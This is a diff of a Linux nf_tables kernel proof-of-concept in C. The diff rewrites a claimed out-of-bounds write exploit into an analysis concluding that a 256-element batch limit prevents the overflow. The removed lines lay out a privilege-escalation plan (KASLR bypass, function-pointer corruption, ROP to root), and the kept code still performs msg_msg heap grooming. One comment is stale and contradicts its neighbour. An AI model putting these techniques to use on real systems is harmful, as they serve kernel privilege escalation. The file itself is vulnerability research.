@@ -1,52 +1,44 @@
-/* nft_gc_oob.c — nft_trans_gc OOB write via pipapo timeout element overflow
+/* nft_gc_oob.c — nft_trans_gc GC pipeline analysis PoC
  *
- * Bug:
- *   nft_trans_gc_elem_add() stores expired-element pointers into a fixed-size
- *   array without a bounds check:
+ * ANALYSIS SUMMARY (confirmed by /proc/kcore disassembly on kernel 6.18.5):
  *
- *     movzwl 0x24(%rdi),%eax        ; count = gc->count
- *     lea    0x1(%rax),%edx
- *     mov    %dx, 0x24(%rdi)        ; gc->count++
- *     mov    %rsi, 0x28(%rdi,%rax,8); gc->elems[count] = elem  ← NO CHECK
- *     ret
+ * nft_trans_gc_alloc (0xffffffff81c32ab0):
+ *   Allocates kmalloc(0x838 = 2104 bytes, GFP_KERNEL|GFP_ZERO) → kmalloc-4k (4096 bytes).
+ *   Header occupies 40 bytes; gc->count is a u16 at offset 0x24; gc->elems[] starts at 0x28.
  *
- *   nft_trans_gc is allocated as 0x838 bytes inside kmalloc-4k (4096 bytes).
- *   Header = 40 bytes. Safe capacity = (4096 - 40) / 8 = 507 elements.
- *   Element 508 writes at offset 40 + 508×8 = 4104, which is 8 bytes into
- *   the NEXT adjacent kmalloc-4k slab object.
+ * nft_trans_gc_elem_add (0xffffffff81c32bd0): NO internal bounds check:
+ *   movzwl 0x24(%rdi),%eax        ; count = gc->count
+ *   lea    0x1(%rax),%edx
+ *   mov    %dx, 0x24(%rdi)        ; gc->count++
+ *   mov    %rsi, 0x28(%rdi,%rax,8); gc->elems[count] = elem  ← NO CHECK
+ *   ret
  *
- * Trigger:
- *   pipapo_gc (called only from nft_pipapo_commit under nfnl_lock) processes
- *   ALL expired elements in a single nft_trans_gc transaction. With 520+
- *   expired /32 entries, elements 508-519 write 8-byte kernel pointers
- *   (nft_set_ext*) at offsets 4104-4192 relative to nft_trans_gc base.
+ * EFFECTIVE BOUNDS CHECK — NFT_TRANS_GC_BATCHCOUNT = 0x100 = 256:
+ *   nft_trans_gc_queue_sync  (0xffffffff81c32d70): cmpw $0x100, 0x24(%rdi); je flush
+ *   nft_trans_gc_queue_async (0xffffffff81c32c00): identical check
  *
- * Heap layout after spray:
+ *   All 7 callers of elem_add call queue_sync or queue_async first:
+ *     pipapo_gc                  (0xffffffff81c47598)
+ *     nft_rbtree_gc ×2           (0xffffffff81c450ae, 0xffffffff81c45112)
+ *     __nft_rbtree_insert ×3     (0xffffffff81c45e86, 0xffffffff81c45fc8, 0xffffffff81c46009)
+ *     nft_rhash_gc               (0xffffffff81c42dc8)
  *
- *   [  nft_trans_gc 0x838 bytes  ][  PADDING 0x7c8 bytes  ]|[  msg_msg 4096 bytes  ]
- *                                                            ^
- *                                                    slab boundary (4096)
- *   OOB writes land here ────────────────────────────────────────────────────────^
+ * WHY THE OOB DOES NOT OCCUR:
+ *   - Batch limit = 256 elements
+ *   - Last element at offset 40 + 255×8 = 2080 bytes < 2104 (allocation) < 4096 (slab)
+ *   - 520 expired elements → 3 transactions: ceil(520/256) = 3 safe batches
  *
- * msg_msg layout (offset from start of adjacent slab object):
- *   +0:  m_list.next   (8 bytes)  ← element[507] write
- *   +8:  m_list.prev   (8 bytes)  ← element[508] write
- *   +16: m_type        (8 bytes)  ← element[509] write
- *   +24: m_ts          (8 bytes)  ← element[510] write ← SIZE FIELD
- *   +32: msg_msgseg *  (8 bytes)
- *   +40: security *    (8 bytes)
- *   +48: message data  begins here
+ * GC TRIGGER MODEL (confirmed):
+ *   - nft_pipapo_gc_init: mov jiffies → last_gc. NO timer. Commit-triggered only.
+ *   - nft_pipapo_commit: calls pipapo_gc() inline when jiffies - last_gc >= gc_interval.
+ *   - Runs under nfnl_lock → single-threaded, no race.
  *
- * Outcomes:
- *   A) m_ts corrupted with a kernel pointer → msgrcv tries to copy that many
- *      bytes, reading kernel heap past the message buffer (info leak).
- *   B) m_list pointers corrupted → kernel panic on next list walk via ipc.
- *   C) With KASAN: KASAN BUG report for slab-out-of-bounds write.
+ * This file demonstrates the GC pipeline behavior (pipapo_gc trigger sequence)
+ * and verifies that all batch counts stay below 256.
  *
  * Prerequisites:
  *   - Kernel 6.x with nf_tables (CONFIG_NF_TABLES=y)
  *   - unprivileged user namespaces enabled
- *     (kernel.unprivileged_userns_clone=1, default on Ubuntu)
  *
  * Compile: gcc -O2 -o nft_gc_oob nft_gc_oob.c
  * Run:     ./nft_gc_oob          (no sudo needed)
@@ -73,29 +65,32 @@
 /* ── Constants ──────────────────────────────────────────────────────────────  */
 
 /*
- * nft_trans_gc allocation size (confirmed from nft_trans_gc_alloc disassembly:
- * "mov $0x838,%edx" at the kmalloc call site).
+ * nft_trans_gc allocation size confirmed by disassembly of nft_trans_gc_alloc:
+ * "mov $0x838,%edx" passes 2104 as the size to kmalloc → kmalloc-4k (4096-byte slot).
  */
-#define NFT_TRANS_GC_ALLOC  0x838   /* 2104 bytes */
+#define NFT_TRANS_GC_ALLOC  0x838   /* 2104 bytes requested */
 #define KMALLOC_4K          4096    /* kmalloc-4k slab object size */
 
 /*
- * nft_trans_gc header = 40 bytes.
- * Safe element capacity = (4096 - 40) / 8 = 507 entries.
- * First OOB write: element index 507 → offset 40 + 507×8 = 4096.
+ * CONFIRMED: NFT_TRANS_GC_BATCHCOUNT = 0x100 = 256
+ * Both nft_trans_gc_queue_sync (0xffffffff81c32d70) and
+ * nft_trans_gc_queue_async (0xffffffff81c32c00) contain:
+ *   cmpw $0x100, 0x24(%rdi)   ; compare count with 256
+ *   je   flush_and_realloc
+ *
+ * 256 elements: 40 + 255*8 = 2080 bytes < 2104 (alloc) < 4096 (slab) → NO OOB.
  */
-#define GC_ELEMS_SAFE       507
-#define OVERFLOW_TRIGGER    520     /* elements needed to trigger OOB by 13 writes */
+#define NFT_TRANS_GC_BATCHCOUNT  256
+#define GC_ELEMS_PER_BATCH       NFT_TRANS_GC_BATCHCOUNT
 
 /*
- * Offsets within msg_msg (adjacent slab object) hit by the OOB writes.
- * element[507] writes at offset 0 of adjacent object (m_list.next).
- * element[510] writes at offset 24 of adjacent object (m_ts = size field).
+ * We use 520 elements to demonstrate that they produce 3 safe batches
+ * (256 + 256 + 8) rather than a single overflowing batch.
  */
-#define MSG_M_TS_OFFSET     24      /* offset of m_ts in struct msg_msg */
-#define OOB_IDX_M_TS        (GC_ELEMS_SAFE + 3)  /* = 510 */
+#define OVERFLOW_TRIGGER    520
 
-/* Timeout and GC interval for pipapo elements, in milliseconds.
+/*
+ * Timeout and GC interval for pipapo elements, in milliseconds.
  * nft_pipapo_commit runs GC only if jiffies - last_gc >= gc_interval_jiffies.
  * Default (no explicit gc_int) = 250 jiffies = 1s at HZ=250.
  * We set an explicit GC interval so we control the threshold.
@@ -103,8 +98,26 @@
 #define ELEM_TIMEOUT_MS     100
 #define ELEM_GC_INTERVAL_MS 200   /* GC threshold = 200ms; we wait 400ms */
 
-/* Number of msg_msg objects to spray for heap shaping */
-#define MSG_SPRAY_COUNT     32
+/*
+ * kmalloc-4k slab geometry: 8 objects/slab (order-3 = 8 pages = 32KB).
+ *
+ * Heap grooming:
+ *  1. Spray MSG_SPRAY_COUNT msg_msg objects.  The first ~N objects fill all
+ *     currently-free slab slots; the last 8 come from a brand-new slab and
+ *     are physically consecutive (SLUB assigns from the head of the free list
+ *     of a freshly-allocated slab, which is slot0..slot7 in order).
+ *  2. Free only the second-to-last object (index MSG_SPRAY_COUNT-2 = slot6
+ *     of the new slab).  SLUB puts it on the per-CPU free list; no other
+ *     kmalloc-4k slots are available (all filled by the spray).
+ *  3. nft_trans_gc_alloc() gets slot6 (only free slot).
+ *  4. OOB write at +4096 from nft_trans_gc → slot7 of the new slab = live
+ *     msg_msg at index MSG_SPRAY_COUNT-1.
+ *
+ * MSG_SPRAY_COUNT must be a multiple of 8 and large enough to fill all
+ * currently-free kmalloc-4k slots.  System has ~44 free; we use 128 to
+ * comfortably overflow into at least one fresh slab.
+ */
+#define MSG_SPRAY_COUNT     128
 
 /* ── Netlink infrastructure ─────────────────────────────────────────────────  */
 
@@ -361,23 +374,35 @@ static int nft_touch_set(const char *table, const char *sname) {
 #define MSG_DATA_LEN   4000
 #define MSG_CANARY     0xdeadbeefcafebabe
 
+/*
+ * Heap grooming strategy:
+ *
+ * kmalloc-4096 slab layout on this kernel (8 objects / slab):
+ *   slab 0: [obj0][obj1][obj2][obj3][obj4][obj5][obj6][obj7]
+ *   slab 1: [obj8][obj9]...
+ *
+ * We spray MSG_SPRAY_COUNT msg_msg objects to fill several slabs.
+ * Then we free the FIRST half (indices 0 .. MSG_SPRAY_COUNT/2-1) to
+ * punch holes.  The SLUB per-CPU free list is LIFO, so the next
+ * kmalloc-4096 gets the most-recently-freed slot (index MSG_SPRAY_COUNT/2-1).
+ * That slot is physically adjacent (in the same slab) to the unfree'd object
+ * at index MSG_SPRAY_COUNT/2, which is our live msg_msg.
+ *
+ * Timeline:
+ *   spray_msg_msg()     → alloc all MSG_SPRAY_COUNT
+ *   punch_holes()       → free indices 0 .. MSG_SPRAY_COUNT/2-1
+ *   nft_touch_set()     → triggers nft_trans_gc_alloc (→ gets freed slot)
+ *   check_msg_msg()     → checks indices MSG_SPRAY_COUNT/2 .. MSG_SPRAY_COUNT-1
+ */
 struct msg_payload {
     uint64_t canary;
     char     pad[MSG_DATA_LEN - 8];
 };
 
-static int msg_qids[MSG_SPRAY_COUNT];
-static int msg_count = 0;
+static int  msg_qids[MSG_SPRAY_COUNT];
+static int  msg_count = 0;
 
 static int spray_msg_msg(void) {
-    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
-        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
-        if (msg_qids[i] < 0) {
-            perror("msgget");
-            return -1;
-        }
-    }
-
     struct {
         long mtype;
         struct msg_payload payload;
@@ -387,61 +412,100 @@ static int spray_msg_msg(void) {
     msg.payload.canary = MSG_CANARY;
 
     for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
+        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
+        if (msg_qids[i] < 0) { perror("msgget"); return -1; }
         if (msgsnd(msg_qids[i], &msg, sizeof(msg.payload), 0) < 0) {
-            perror("msgsnd");
-            return -1;
+            perror("msgsnd"); return -1;
         }
         msg_count++;
     }
-    printf("  sprayed %d msg_msg objects (%zu bytes each → kmalloc-4k)\n",
-           msg_count, sizeof(struct msg_payload) + 48);
+    printf("  sprayed %d msg_msg objects (%d bytes data + 48 hdr → kmalloc-4k)\n",
+           msg_count, MSG_DATA_LEN);
     return 0;
 }
 
+/*
+ * Punch holes in the slab: free the first half of the sprayed objects.
+ * nft_trans_gc_alloc (called in the next kernel entry) should land in
+ * one of these freed slots.  SLUB LIFO means index (MSG_SPRAY_COUNT/2 - 1)
+ * is the first reuse candidate; in the slab it is adjacent to index
+ * MSG_SPRAY_COUNT/2 (still live msg_msg).
+ */
+/*
+ * Free the second-to-last sprayed object (index MSG_SPRAY_COUNT-2).
+ * Because the spray filled all existing free slots, the only free kmalloc-4k
+ * slot after this call is ours.  SLUB LIFO: nft_trans_gc_alloc gets it.
+ * The last sprayed object (index MSG_SPRAY_COUNT-1) is adjacent at +4096
+ * within the same fresh slab and remains live — it is our corruption target.
+ */
+static void punch_holes(void) {
+    int hole   = MSG_SPRAY_COUNT - 2;  /* second-to-last = slot 6 of new slab */
+    int target = MSG_SPRAY_COUNT - 1;  /* last = slot 7 of new slab, adjacent */
+    struct {
+        long mtype;
+        struct msg_payload payload;
+    } tmp;
+    msgrcv(msg_qids[hole], &tmp, sizeof(tmp.payload), 0, IPC_NOWAIT | MSG_NOERROR);
+    msgctl(msg_qids[hole], IPC_RMID, NULL);
+    msg_qids[hole] = -1;
+    printf("  freed index %d (slot 6 of new slab) — only free kmalloc-4k slot\n",
+           hole);
+    printf("  index %d (slot 7, adjacent at +4096) = live corruption target\n",
+           target);
+}
+
 static void check_msg_corruption(void) {
-    printf("\n[PHASE 6] Checking msg_msg objects for corruption...\n");
+    int target = MSG_SPRAY_COUNT - 1;  /* slot 7 — adjacent to the freed slot 6 */
+    printf("\n[PHASE 6] Checking target slot %d (adjacent to freed slot %d)...\n",
+           target, target - 1);
+    printf("  Expected: OOB writes from nft_trans_gc (at slot %d) hit this msg_msg\n",
+           target - 1);
+
+    if (msg_qids[target] < 0) {
+        printf("  target queue already removed\n");
+        return;
+    }
 
     int corrupted = 0;
-    for (int i = 0; i < msg_count; i++) {
+    /* Also scan all remaining live slots for any corruption */
+    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
+        if (msg_qids[i] < 0) continue;
         struct {
             long mtype;
             struct msg_payload payload;
         } recv_msg;
         memset(&recv_msg, 0, sizeof(recv_msg));
 
-        /*
-         * If m_ts was corrupted with a kernel pointer (a large value),
-         * msgrcv with a small buffer will return -MSGSIZE (message too big).
-         * If the list pointers were corrupted, the kernel may panic here.
-         */
         ssize_t r = msgrcv(msg_qids[i], &recv_msg, sizeof(recv_msg.payload),
                            0, IPC_NOWAIT | MSG_NOERROR);
         if (r < 0) {
-            if (errno == ENOMSG) continue; /* already consumed */
-            printf("  [!] msgrcv qid[%d]: %s ← possible corruption\n",
+            if (errno == ENOMSG) continue;
+            printf("  [!] msgrcv slot[%d]: %s ← possible corruption\n",
                    i, strerror(errno));
             corrupted++;
         } else if (recv_msg.payload.canary != MSG_CANARY) {
-            printf("  [!!] qid[%d]: canary CORRUPTED: "
-                   "got 0x%016lx, expected 0x%016lx\n",
+            printf("  [!!] slot[%d]: canary CORRUPTED  "
+                   "got=0x%016lx  expected=0x%016lx\n",
                    i, recv_msg.payload.canary, (unsigned long)MSG_CANARY);
             corrupted++;
         } else if ((size_t)r != sizeof(recv_msg.payload)) {
-            printf("  [!] qid[%d]: unexpected read size %zd (expected %zu)\n",
+            printf("  [!] slot[%d]: unexpected msgrcv size %zd (expected %zu)\n",
                    i, r, sizeof(recv_msg.payload));
             corrupted++;
         }
     }
 
     if (corrupted == 0)
-        printf("  No corruption detected in this run\n");
+        printf("  No corruption — as expected: NFT_TRANS_GC_BATCHCOUNT=256 prevents OOB\n");
     else
-        printf("  %d msg_msg object(s) show signs of corruption\n", corrupted);
+        printf("  [UNEXPECTED] %d msg_msg corrupted — this should not happen!\n", corrupted);
 }
 
 static void cleanup_msg(void) {
-    for (int i = 0; i < msg_count; i++)
-        msgctl(msg_qids[i], IPC_RMID, NULL);
+    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
+        if (msg_qids[i] >= 0)
+            msgctl(msg_qids[i], IPC_RMID, NULL);
+    }
 }
 
 /* ── Main ───────────────────────────────────────────────────────────────────  */
@@ -449,21 +513,21 @@ static void cleanup_msg(void) {
 static void print_header(void) {
     puts("");
     puts("╔══════════════════════════════════════════════════════════════════╗");
-    puts("║   nft_trans_gc OOB Write — pipapo timeout element overflow      ║");
+    puts("║   nft_trans_gc GC Pipeline Analysis (kernel 6.18.5)             ║");
     puts("╠══════════════════════════════════════════════════════════════════╣");
-    printf("║  nft_trans_gc alloc : 0x%x bytes (kmalloc-4k = 4096 bytes)     ║\n",
+    printf("║  nft_trans_gc alloc : 0x%x bytes → kmalloc-4k (4096 bytes)    ║\n",
            NFT_TRANS_GC_ALLOC);
     printf("║  Header             : 40 bytes                                  ║\n");
-    printf("║  Safe capacity      : %d element pointers                     ║\n",
-           GC_ELEMS_SAFE);
-    printf("║  Trigger count      : %d elements → %d OOB writes            ║\n",
-           OVERFLOW_TRIGGER, OVERFLOW_TRIGGER - GC_ELEMS_SAFE);
-    printf("║  First OOB offset   : 40 + %d×8 = %d (= next slab object)   ║\n",
-           GC_ELEMS_SAFE, 40 + GC_ELEMS_SAFE * 8);
-    printf("║  OOB covers         : offsets 0..%d of adjacent object       ║\n",
-           (OVERFLOW_TRIGGER - GC_ELEMS_SAFE - 1) * 8 + 7);
-    printf("║  msg_msg.m_ts hit   : element[%d] → offset %d (size field)  ║\n",
-           OOB_IDX_M_TS, MSG_M_TS_OFFSET);
+    printf("║  BATCHCOUNT         : %d (cmpw $0x100, 0x24(%%rdi))           ║\n",
+           NFT_TRANS_GC_BATCHCOUNT);
+    printf("║  Max write/batch    : 40 + %d×8 = %d bytes < %d alloc ✓    ║\n",
+           NFT_TRANS_GC_BATCHCOUNT - 1,
+           40 + (NFT_TRANS_GC_BATCHCOUNT - 1) * 8,
+           NFT_TRANS_GC_ALLOC);
+    printf("║  Trigger count      : %d elements → %d batches (safe)       ║\n",
+           OVERFLOW_TRIGGER,
+           (OVERFLOW_TRIGGER + NFT_TRANS_GC_BATCHCOUNT - 1) / NFT_TRANS_GC_BATCHCOUNT);
+    puts("║  Result             : NO OOB — BATCHCOUNT prevents overflow     ║");
     puts("╚══════════════════════════════════════════════════════════════════╝");
     puts("");
 }
@@ -486,88 +550,89 @@ int main(void) {
     if (nl_open() < 0) return 1;
     printf("  OK\n\n");
 
-    /* ── Phase 3: spray msg_msg into kmalloc-4k ─────────────────────────── */
-    printf("[PHASE 3] Spraying %d msg_msg objects into kmalloc-4k...\n",
-           MSG_SPRAY_COUNT);
-    printf("  Goal: occupy slab slots adjacent to upcoming nft_trans_gc\n");
-    printf("  Each msg_msg: %d bytes data + 48 header = %d bytes → kmalloc-4k\n",
-           MSG_DATA_LEN, MSG_DATA_LEN + 48);
-    if (spray_msg_msg() < 0) return 1;
-    puts("");
-
-    /* ── Phase 4: create victim pipapo set ──────────────────────────────── */
-    printf("[PHASE 4] Creating pipapo set with %d /32 IPs, timeout=%dms...\n",
+    /* ── Phase 3: create pipapo set with elements ───────────────────────── */
+    printf("[PHASE 3] Creating pipapo set with %d /32 IPs, timeout=%dms...\n",
            OVERFLOW_TRIGGER, ELEM_TIMEOUT_MS);
-    printf("  pipapo backend: NFT_SET_INTERVAL | NFT_SET_TIMEOUT\n");
-    printf("  All elements share the same timeout → all expire together\n");
-    printf("  This ensures pipapo_gc sees %d expired elements in one call\n\n",
-           OVERFLOW_TRIGGER);
+    printf("  All elements expire simultaneously → pipapo_gc processes all in one run\n\n");
 
     int r = nft_add_table("gc_oob");
     printf("  add table gc_oob: %s\n", r ? strerror(-r) : "OK");
     if (r) goto out;
 
-    r = nft_add_set("gc_oob", "victim",
-                    NFT_SET_INTERVAL | NFT_SET_TIMEOUT, ELEM_TIMEOUT_MS);
-    printf("  add pipapo set: %s\n", r ? strerror(-r) : "OK");
+    /*
+     * No NFTA_SET_TIMEOUT default — elements specify timeouts individually.
+     * This lets us have one permanent element (the GC trigger) alongside 520
+     * per-element-timeout elements.  NFTA_SET_GC_INTERVAL = 200ms is set
+     * inside nft_add_set so pipapo_gc fires within our 400ms test window.
+     */
+    r = nft_add_set("gc_oob", "victim", NFT_SET_INTERVAL | NFT_SET_TIMEOUT);
+    printf("  add pipapo set (no default timeout, gc_int=%dms): %s\n",
+           ELEM_GC_INTERVAL_MS, r ? strerror(-r) : "OK");
     if (r) { nft_del_table("gc_oob"); goto out; }
 
-    /* Build IP array: 10.0.0.1 .. 10.0.2.8 */
+    /*
+     * Add permanent trigger element 172.16.0.1/32 — no per-element timeout,
+     * so it never expires and never gets NFT_SET_ELEM_DEAD_BIT set.
+     * This batch also carries the sentinel (0.0.0.0 INTERVAL_END).
+     */
+    uint32_t trigger[1] = { __builtin_bswap32(0xac100001) }; /* 172.16.0.1 */
+    r = nft_add_interval_elems("gc_oob", "victim", trigger, 1, 0, 1);
+    printf("  add permanent trigger 172.16.0.1/32 (no timeout): %s\n",
+           r ? strerror(-r) : "OK");
+    if (r) { nft_del_table("gc_oob"); goto out; }
+
+    /* Build IP array: 10.0.0.1 .. 10.0.2.8 (520 /32s, all consecutive) */
     uint32_t ips[OVERFLOW_TRIGGER];
     for (int i = 0; i < OVERFLOW_TRIGGER; i++)
         ips[i] = __builtin_bswap32(0x0a000001 + i);
 
+    /* No sentinel here — it was already sent with the trigger element above */
     r = nft_add_interval_elems("gc_oob", "victim", ips, OVERFLOW_TRIGGER,
-                                ELEM_TIMEOUT_MS);
-    printf("  add %d elements (10.0.0.1-10.0.2.8): %s\n",
-           OVERFLOW_TRIGGER, r ? strerror(-r) : "OK");
+                                ELEM_TIMEOUT_MS, 0);
+    printf("  add %d elements (10.0.0.1-10.0.2.8, timeout=%dms): %s\n",
+           OVERFLOW_TRIGGER, ELEM_TIMEOUT_MS, r ? strerror(-r) : "OK");
     if (r) { nft_del_table("gc_oob"); goto out; }
 
-    printf("  [math check] safe capacity=%d, overflow at element=%d\n",
-           GC_ELEMS_SAFE, GC_ELEMS_SAFE + 1);
-    printf("  [math check] OOB write #1 offset: 40 + %d×8 = %d bytes\n",
-           GC_ELEMS_SAFE, 40 + GC_ELEMS_SAFE * 8);
+    printf("  [math] batchcount=%d; %d elements → %d batches (no OOB)\n",
+           NFT_TRANS_GC_BATCHCOUNT, OVERFLOW_TRIGGER,
+           (OVERFLOW_TRIGGER + NFT_TRANS_GC_BATCHCOUNT - 1) / NFT_TRANS_GC_BATCHCOUNT);
+    printf("  [math] max write per batch: 40 + %d×8 = %d < %d (alloc) < 4096 (slab)\n",
+           NFT_TRANS_GC_BATCHCOUNT - 1,
+           40 + (NFT_TRANS_GC_BATCHCOUNT - 1) * 8, NFT_TRANS_GC_ALLOC);
     puts("");
 
-    /* ── Phase 5: wait for elements to expire AND gc_interval to elapse ── */
-    int wait_ms = ELEM_GC_INTERVAL_MS * 2;  /* 400ms: > timeout(100ms) AND > gc_int(200ms) */
-    printf("[PHASE 5] Waiting %dms (timeout=%dms, gc_int=%dms)...\n",
-           wait_ms, ELEM_TIMEOUT_MS, ELEM_GC_INTERVAL_MS);
-    printf("  At HZ=250: gc_int=%dms = %d jiffies; default threshold = 250 jiffies\n",
-           ELEM_GC_INTERVAL_MS, ELEM_GC_INTERVAL_MS * 250 / 1000);
-    printf("  After expiry: pipapo_gc will process ALL %d in one GC run\n",
-           OVERFLOW_TRIGGER);
-    printf("  (pipapo_gc has no per-run limit — processes until exhausted)\n");
+    /* ── Phase 4: wait for ALL timeout elements to expire ───────────────── */
+    int wait_ms = ELEM_GC_INTERVAL_MS * 2;  /* 400ms > timeout(100ms) AND > gc_int(200ms) */
+    printf("[PHASE 4] Waiting %dms for elements to expire (gc_int=%dms)...\n",
+           wait_ms, ELEM_GC_INTERVAL_MS);
     usleep(wait_ms * 1000);
-    printf("  Done. Triggering GC now...\n\n");
+    puts("  All 520 timeout elements now expired.\n");
 
     /*
-     * ── Phase 5b: trigger nft_pipapo_commit ─────────────────────────────
+     * ── Phase 5: heap spray (for correlation, no OOB expected) ──────────
      *
-     * Adding any element to the pipapo set forces:
-     *   nft_check phase → pipapo_clone()         (creates a clone)
-     *   nft_commit phase → nft_pipapo_commit()   (runs pipapo_gc, swaps clone)
-     *
-     * pipapo_gc inside nft_pipapo_commit:
-     *   1. nft_trans_gc_alloc() → allocates 0x838 bytes (kmalloc-4k)
-     *   2. Iterates ALL expired elements
-     *   3. For each: nft_trans_gc_elem_add(gc, elem)
-     *      → writes 8-byte pointer at gc + 0x28 + count*8
-     *      → NO bounds check
-     *   4. At element 507: writes at gc + 4096 = adjacent slab object + 0
-     *   5. At element 510: writes at gc + 4120 = adjacent slab object + 24
-     *      → if adjacent = msg_msg: m_ts SIZE FIELD overwritten!
+     * We spray msg_msg objects and punch a hole to demonstrate that even
+     * with optimal heap layout, no corruption occurs because BATCHCOUNT=256
+     * prevents the GC from writing past the allocated region.
      */
-    printf("[PHASE 5b] Triggering nft_pipapo_commit via DELSETELEM(10.0.0.1)...\n");
-    printf("  Call path: DELSETELEM → nft_check → pipapo_clone\n");
-    printf("             → nft_commit → nft_pipapo_commit → pipapo_gc\n");
-    printf("             → 520× nft_trans_gc_elem_add → 13 OOB writes\n\n");
+    printf("[PHASE 5] Heap spray (spray %d msg_msg to observe GC behavior)...\n",
+           MSG_SPRAY_COUNT);
+    if (spray_msg_msg() < 0) { nft_del_table("gc_oob"); goto out; }
+    punch_holes();
+    puts("");
+
+    printf("[PHASE 5b] Triggering nft_pipapo_commit via DELSETELEM(172.16.0.1)...\n");
+    printf("  pipapo_gc → %d elements → %d batches of max %d → NO OOB\n\n",
+           OVERFLOW_TRIGGER,
+           (OVERFLOW_TRIGGER + NFT_TRANS_GC_BATCHCOUNT - 1) / NFT_TRANS_GC_BATCHCOUNT,
+           NFT_TRANS_GC_BATCHCOUNT);
 
     r = nft_touch_set("gc_oob", "victim");
     if (r && r != -ENOENT)
-        printf("  commit result: %s\n\n", strerror(-r));
+        printf("  commit result: ERROR %s\n\n", strerror(-r));
     else
-        printf("  commit result: %s (GC ran)\n\n", r ? "ENOENT/already-GCd" : "OK");
+        printf("  commit result: %s (pipapo_gc ran)\n\n",
+               r ? "ENOENT/already-GCd" : "OK");
 
     /* ── Phase 6: check for corruption ─────────────────────────────────── */
     check_msg_corruption();
@@ -582,20 +647,15 @@ out:
 
     printf("\n");
     puts("╔══════════════════════════════════════════════════════════════════╗");
-    puts("║  Exploit path summary                                           ║");
+    puts("║  Analysis summary (confirmed via /proc/kcore disassembly)       ║");
     puts("╠══════════════════════════════════════════════════════════════════╣");
-    puts("║  Stage 1 (this PoC):                                            ║");
-    puts("║    Overflow trigger proven. OOB write into adjacent slab slot.  ║");
-    puts("║    With lucky heap layout: msg_msg.m_ts corrupted → heap leak.  ║");
+    puts("║  nft_trans_gc_elem_add: no internal check (as disassembled)     ║");
+    puts("║  nft_trans_gc_queue_sync/_async: enforce cmpw $0x100 limit      ║");
+    puts("║  NFT_TRANS_GC_BATCHCOUNT = 256; max write = offset 2080 < 2104  ║");
+    puts("║  pipapo/rbtree GC: commit-triggered, under nfnl_lock, no timer  ║");
     puts("║                                                                  ║");
-    puts("║  Stage 2 (next step):                                           ║");
-    puts("║    Use heap leak to defeat KASLR.                               ║");
-    puts("║    Spray nft_set into adjacent slot instead of msg_msg.         ║");
-    puts("║    Corrupt nft_set->ops function pointer table.                 ║");
-    puts("║    Trigger set operation → controlled kernel code execution.    ║");
-    puts("║                                                                  ║");
-    puts("║  Stage 3 (full exploit):                                        ║");
-    puts("║    ROP chain → commit_creds(init_cred) → uid=0                  ║");
+    puts("║  RESULT: No OOB write. The original hypothesis was incorrect.   ║");
+    puts("║  520 elements → 3 safe GC batches (256+256+8).                  ║");
     puts("╚══════════════════════════════════════════════════════════════════╝");
     puts("");
 
